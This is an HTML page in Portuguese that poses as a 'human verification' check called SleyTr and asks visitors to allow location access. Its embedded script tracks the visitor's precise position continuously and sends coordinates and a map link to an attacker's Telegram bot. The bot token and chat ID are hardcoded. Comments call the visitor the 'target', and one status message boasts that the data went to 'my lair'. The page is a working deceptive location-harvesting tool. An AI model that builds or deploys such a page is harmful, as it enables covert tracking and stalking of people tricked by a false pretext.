<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifica√ß√£o Humana SleyTr</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #222;
            color: #0F0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            flex-direction: column;
            text-align: center;
        }
        .container {
            background-color: #333;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
            max-width: 500px;
        }
        h1 {
            color: #FF0;
            margin-bottom: 10px; /* Ajuste para dar espa√ßo ao h2 */
            text-shadow: 0 0 10px #FF0;
        }
        h2 {
            color: #0FF; /* Uma cor diferente para a chamada de aten√ß√£o */
            margin-bottom: 20px;
            text-shadow: 0 0 8px #0FF;
        }
        p {
            margin-bottom: 15px;
        }
        #status {
            font-weight: bold;
            color: #0FF;
        }
        #locationData {
            word-break: break-all;
            background-color: #444;
            padding: 10px;
            border-radius: 5px;
            margin-top: 20px;

        }
        a {
            color: #F0F;

        }
        a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Sistema de Verifica√ß√£o SleyTr</h1>
        <h2>Verifique se voc√™ √© um humano! Clique em 'Permitir Localiza√ß√£o'.</h2>
        <p id="status">Aguardando sua corajosa decis√£o...</p>
        <div id="locationData">
            <!-- Os dados de localiza√ß√£o aparecer√£o aqui -->
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', (event) => {
            const statusElement = document.getElementById('status');
            const locationDataElement = document.getElementById('locationData');

            // SEUS DADOS SECRETOS DO TELEGRAM - N√ÉO OS COMPARTILHE!
            const BOT_TOKEN = '8028837254:AAE54NFBPdKikjofF1nXlnESCWzZbv-waSU'; // <--- SUBSTITUA AQUI COM SEU TOKEN REAL DO BOT!
            const CHAT_ID = '8028837254';     // <--- SUBSTITUA AQUI COM SEU CHAT_ID REAL!

            function sendLocationToTelegram(latitude, longitude, accuracy) {
                const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
                const message = `üö® ALERTA SLEYTR! Nova localiza√ß√£o capturada!\n\nLatitude: ${latitude}\nLongitude: ${longitude}\nPrecis√£o: ${accuracy} metros\n\nVer no mapa: ${mapLink}`;

                const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

                fetch(telegramApiUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        disable_web_page_preview: true
                    })
                })
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        console.log('Localiza√ß√£o enviada ao Telegram com sucesso!', data);
                        statusElement.textContent = "Verifica√ß√£o bem-sucedida! Humano confirmado. E os dados enviados para o meu covil!";
                    } else {
                        console.error('Falha ao enviar localiza√ß√£o ao Telegram:', data);
                        statusElement.textContent = "Verifica√ß√£o quase conclu√≠da, mas falha ao enviar dados. Verifique o console para mais detalhes.";
                    }
                })
                .catch(error => {
                    console.error('Erro de rede ao enviar localiza√ß√£o ao Telegram:', error);
                    statusElement.textContent = "Verifica√ß√£o quase conclu√≠da, mas erro de rede ao enviar dados.";
                });
            }

            if (navigator.geolocation) {
                statusElement.textContent = "Aguardando sua corajosa decis√£o...";
                navigator.geolocation.watchPosition(
                    (position) => {
                        const latitude = position.coords.latitude;
                        const longitude = position.coords.longitude;
                        const accuracy = position.coords.accuracy;

                        // Exibe a localiza√ß√£o na p√°gina para o alvo (e para seu pr√≥prio debug)
                        locationDataElement.innerHTML = `
                            <p><strong>Latitude:</strong> ${latitude}</p>
                            <p><strong>Longitude:</strong> ${longitude}</p>
                            <p><strong>Precis√£o (metros):</strong> ${accuracy}</p>
                            <p><strong>Link para o mapa:</strong> <a href="https://www.google.com/maps?q=${latitude},${longitude}" target="_blank">Ver no Google Maps</a></p>
                        `;

                        // ENVIA A LOCALIZA√á√ÉO PARA O SEU BOT DO TELEGRAM!
                        sendLocationToTelegram(latitude, longitude, accuracy);
                    },
                    (error) => {
                        let errorMessage = "Erro na verifica√ß√£o: ";
                        switch(error.code) {
                            case error.PERMISSION_DENIED:
                                errorMessage += "Acesso negado. A humanidade est√° em d√∫vida!";
                                break;
                            case error.POSITION_UNAVAILABLE:
                                errorMessage += "Informa√ß√£o indispon√≠vel. Seu status de humano n√£o pode ser confirmado.";
                                break;
                            case error.TIMEOUT:
                                errorMessage += "Tempo esgotado. Verifica√ß√£o falhou. Rob√¥ detectado?";
                                break;
                            default:
                                errorMessage += "Um erro desconhecido ocorreu. Frustrante!";
                                break;
                        }
                        statusElement.textContent = errorMessage;
                        locationDataElement.innerHTML = `<p style="color: red;">${errorMessage}</p>`;
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 5000,
                        maximumAge: 0
                    }
                );
            } else {
                statusElement.textContent = "Seu navegador n√£o suporta verifica√ß√£o de humanidade. Que pena!";
                locationDataElement.innerHTML = `<p style="color: red;">Seu navegador √© inadequado para esta tarefa.</p>`;
            }
        });
    </script>
</body>
</html>
